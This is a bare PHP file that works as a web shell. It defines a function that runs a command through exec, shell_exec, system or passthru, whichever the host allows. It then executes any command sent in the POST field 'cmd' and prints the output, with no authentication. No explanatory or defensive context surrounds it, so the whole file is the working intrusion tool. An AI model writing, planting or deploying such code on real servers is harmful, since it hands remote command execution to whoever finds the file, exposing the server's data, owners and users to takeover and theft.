<?php
function myshellexec($cmd)
{ 
    $result = "";
    if(is_callable("exec")) {
		exec($cmd,$result); 
		$result = join("\n",$result);
	}
    elseif(is_callable("shell_exec"))
		$result = shell_exec($cmd);
    elseif(is_callable("system")){
		@ob_start(); 
		system($cmd); 
		$result = @ob_get_contents(); 
		@ob_end_clean();
	}
    elseif(is_callable("passthru")){
		@ob_start(); 
		passthru($cmd); 
		$result = @ob_get_contents(); 
		@ob_end_clean();
	} 
    return $result;
}

$cmdline = $_POST['cmd'];
echo myshellexec($cmdline);
die("");
?>